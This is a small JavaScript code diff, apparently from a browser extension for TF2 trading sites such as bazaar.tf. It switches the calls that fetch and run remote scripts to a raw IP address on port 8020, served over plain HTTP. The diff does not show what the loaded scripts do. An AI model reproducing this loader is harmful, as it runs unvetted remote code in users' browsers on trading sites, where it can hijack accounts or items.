@@ -10,13 +10,14 @@
 
 
 
-$.getScript('http://95.47.140.204/tf2/pc/socket.io.js', function(){
+$.getScript('http://95.47.140.204:8020?script=socketIO', function(data, textStatus, jqxhr){
+    console.log(jqxhr.status);
 	if (window.location.hostname.indexOf('bazaar.tf')> -1) {
-		$.getScript('http://95.47.140.204/tf2/pc/bazaar.js',function() {
+		$.getScript('http://95.47.140.204:8020?script=bazaar',function() {
             
 		});
 	}else{
-		$.getScript('http://95.47.140.204/tf2/pc/main.js', function(){
+		$.getScript('http://95.47.140.204:8020?script=outpost', function(){
 		});
 	}
 });
